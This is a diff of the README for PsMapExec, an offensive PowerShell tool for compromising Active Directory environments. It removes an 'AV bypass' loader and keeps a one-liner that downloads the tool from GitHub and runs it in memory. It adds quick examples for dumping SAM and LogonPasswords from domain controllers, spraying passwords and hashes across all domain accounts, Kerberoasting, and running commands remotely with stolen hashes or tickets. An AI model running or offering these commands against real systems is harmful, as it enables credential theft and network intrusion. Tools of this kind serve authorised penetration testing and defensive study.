@@ -1,6 +1,11 @@
 ## What is PsMapExec
 
-A PowerShell tool heavily inspired by the popular tool CrackMapExec. Far too often I find myself on engagements without access to Linux in order to make use of CrackMapExec. 
+
+<p align="Center">
+<img src="https://github.com/The-Viper-One/PsMapExec/assets/68926315/14770c85-b751-4127-8261-2e49ff25a8ad" width="280" height="280">
+</p>
+
+A PowerShell tool heavily inspired by the popular tool CrackMapExec / NetExec. PsMapExec aims to bring the function and feel of these tools to PowerShell with its own arsenal of improvements. 
 
 PsMapExec is used as a post-exploitation tool to assess and compromise an Active Directory environment. 
 
@@ -18,6 +23,8 @@ It is highly recommended to go through the documentation listed below to get the
 
 Currently supported  methods (Protocols)
 
+* IPMI
+* MSSQL
 * RDP
 * SessionHunter
 * SMB
@@ -29,43 +36,88 @@ Currently supported  methods (Protocols)
 
 Planned methods
 
-* MSSQL (In testing)
-* IPMI
 * SNMP (In testing)
 * FTP
 * SSH
   
 ## Usage
-### Load the script directly into memory (Bypass AV)
-```
-IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1");IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/Dev/PsMapExec.ps1")
-```
 ### Load the script directly into memory
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
 ```
+### Quick examples
+```
+# Execute WMI commands over all systems in the domain using password authentication
+ PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""
+
+# Execute WinRM commands over all systems in the domain using hash authentication
+PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""
+
+# Check RDP Access against workstations in the domain and using local authentication
+PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
+ 
+# Dump SAM on a single system using SMB and a -ticket for authentication
+PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM
+
+# Check SMB Signing on all domain systems
+PsMapExec -Targets All -Method GenRelayList
+
+# Dump LogonPasswords on all Domain Controllers over WinRM
+PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords
+
+# Use WMI to check current user admin access from systems read from a text file
+PsMapExec -Targets C:\temp\Systems.txt -Method WMI
+
+# Spray passwords across all accounts in the domain
+PsMapExec -Method Spray -SprayPassword [Password]
+
+# Spray Hashes across all accounts in the domain
+PsMapExec -Method Spray -SprayHash [Hash]
+
+# Spray Hashes across all Domain Admin group users
+PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]
+
+# Kerberoast 
+PsMapExec -Method Kerberoast -ShowOutput
+
+# IPMI
+PsMapExec -Targets 192.168.1.0/24 IPMI
+```
+
 ### Targets Acquisition
 Target acquisition through PsMapExec is utilized through ADSI Searcher. As long as you are operating from a domain joined system as a domain user account, no issues should be encountered when acquiring targets.
 By default only enabled Active Directory computer accounts are populated into the target list. PsMapExec will set the Domain to the current user domain unless -Domain is specified.
-IP Address specification and targets from file are currently unsupported but in development.
+IP Address specification is unsupported but in development.
 ```
-# Grabs all workstations, servers and domain controllers within the domain
+# All workstations, servers and domain controllers within the domain
 PsMapExec -Targets All
 
-# Grabs all workstations, servers and domain controllers on the specified domain
+# All workstations, servers and domain controllers on the specified domain
 PsMapExec -Targets All -Domain [Domain]
 
-# Grabs only servers from the domain
+# Only servers from the domain (exluding DCs)
 PsMapExec -Targets Servers
 
-# Grabs only Domain Controllers from the domain
+# Only Domain Controllers from the domain
 PsMapExec -Targets DCs
 
-# Grabs only workstations from the domain
+# Only workstations from the domain
 PsMapExec -Targets Workstations
 
 # Set the target values to a defined computer name
 PsMapExec -Targets DC01.Security.local
+
+# Read targets from file
+PsMapExec -Targets "C:\Targets.txt"
+
+# Wildcard filtering
+PsMapExec -Targets "SRV*"
+
+# Single IP Address
+PsMapExec -Targets 192.168.56.11
+
+# CIDR Range
+PsMapExec -Targets 192.168.56.0/24
 ```
 ### Authentication Types
 When  -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.
@@ -77,7 +129,7 @@ PsMapExec -Targets All -Method [Method]
 PsMapExec -Targets All -Method [Method] -Username [Username] -Password [Password]
 
 # With Hash
-PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256]
+PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256/NTLM]
 
 # With Ticket
 PsMapExec -Targets All -Method [Method] -Ticket [doI.. OR Path to ticket file]
@@ -91,7 +143,7 @@ All currently supported command execution methods support the -Command  paramete
 PsMapExec -Targets All -Method [Method] -Command [Command]
 ```
 
-### Module Exectuion
+### Module Execution
 All currently supported command execution methods support the -Module  parameter. The module parameter can be appended to the Authentication Types to execute given modules as a specified or the current user. 
 ```
 PsMapExec -Targets All -Method [Method] -Module [Module]
@@ -128,10 +180,6 @@ PsMapExec supports pointing to a locally or alternatively hosted server for the 
 ```
 PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
 ```
-
-## Support me
-<a href="https://www.buymeacoffee.com/ViperOne" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-
 
 ## Showcase
 #### SAM
